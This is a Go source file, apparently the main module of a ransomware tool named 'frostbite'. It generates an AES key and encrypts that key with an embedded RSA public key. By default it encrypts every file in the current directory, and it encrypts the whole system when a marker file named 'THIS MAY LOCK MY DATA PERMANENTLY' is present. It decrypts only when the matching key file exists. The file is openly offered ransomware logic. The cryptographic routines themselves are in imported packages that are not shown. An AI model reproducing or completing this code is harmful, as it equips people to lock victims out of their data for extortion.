package main

import (
	_ "embed"
	"fmt"
	"os"

	enc "frostbite.com/encryption"
	"frostbite.com/tools/file"
	"frostbite.com/tools/system"
)

func ErrCheck(err error) {
	if err != nil {
		panic(err)
	}
}

//go:embed keys/public.key
var pubKeyVar []byte

var pl = fmt.Println

var (
	Mode            string
	encryptedAESKey []byte
)

func main() {
	SetModeOfOperation()
	switch Mode {
	case "decrypt":
		ModeDecrypt()
	case "lock":
		ModeLockSystem()
	case "unlock system":
		ModeUnlockSystem()
	default:
		ModeLockCurrentDir()
	}
}

func SetModeOfOperation() {
	filesThatAlterMode := make(map[string]string)
	filesThatAlterMode["decrypted.key"] = "decrypt"
	filesThatAlterMode["THIS MAY LOCK MY DATA PERMANENTLY"] = "lock"

	for file, mode := range filesThatAlterMode {
		if _, err := os.Stat(file); !os.IsNotExist(err) {
			Mode = mode
			break
		}
	}

	if Mode == "lock" {
		if _, err := os.Stat("decrypted.key"); !os.IsNotExist(err) {
			Mode = "unlock system"
		}
	}

	pl("Mode of operation set to:", Mode)
}

func ModeDecrypt() {
	AESKey, err := os.ReadFile("decrypted.key")
	ErrCheck(err)
	currentDir, err := os.Getwd()
	ErrCheck(err)
	file.DecryptFilesInDir(currentDir, true, AESKey)
}

func ModeLockCurrentDir() {
	key, encryptedAESKey := generateAesAndEncryptedAes()
	// ! Uncomment this line only for testing. Never use this in production!
	// os.WriteFile("decrypted.key", key, 0644)

	file.RunEncryptForCurrentDir(encryptedAESKey, key)
}

func ModeLockSystem() {
	//encrypt aes key with public key
	key, encryptedAESKey := generateAesAndEncryptedAes()

	system.WholeSystemEncrypt(key, encryptedAESKey)
}

func generateAesAndEncryptedAes() ([]byte, []byte) {
	key := enc.GenerateAES()

	//use local public key to encrypt aes key if it exists, else use the embedded public key
	//read "public.key" from current dir and "keys/public.key"
	//if both files exist, use the one in the current dir
	publicKey := readPubKeyFromFileOrEmbedded()

	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(publicKey))

	return key, encryptedAESKey
}

func readPubKeyFromFileOrEmbedded() []byte {
	//keep only one return statement for readability
	var publicKey []byte

	if _, err := os.Stat("public.key"); err == nil {
		publicKey, err = os.ReadFile("public.key")
		ErrCheck(err)
	} else if _, err := os.Stat("keys/public.key"); err == nil {
		publicKey, err = os.ReadFile("keys/public.key")
		ErrCheck(err)
	} else {
		publicKey = pubKeyVar
		if len(publicKey) == 0 {
			panic("Public key not embedded")
		}
	}
	return publicKey
}
func ModeUnlockSystem() {
	AESKey, err := os.ReadFile("decrypted.key")
	ErrCheck(err)
	system.WholeSystemDecrypt(AESKey)
}
